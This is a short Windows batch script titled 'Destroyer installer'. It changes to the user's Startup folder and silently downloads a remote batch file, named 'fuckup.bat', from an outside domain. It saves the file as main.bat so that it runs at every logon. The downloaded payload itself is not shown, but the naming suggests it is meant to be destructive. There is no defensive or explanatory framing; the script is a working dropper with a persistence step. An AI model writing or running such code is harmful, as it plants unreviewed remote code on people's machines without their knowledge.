@echo off
color 0a
title Destroyer installer by Tobir
cls
echo Installing!
echo Going to directory
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
echo Im in directory
echo Downloading files...
curl -s https://sources.tobir.xyz/fuckup.bat > main.bat
echo Downloaded main file (fuckup.bat is now main.bat)
echo The program is now installed, exiting this window...
ping localhost -n 3 > nul
exit
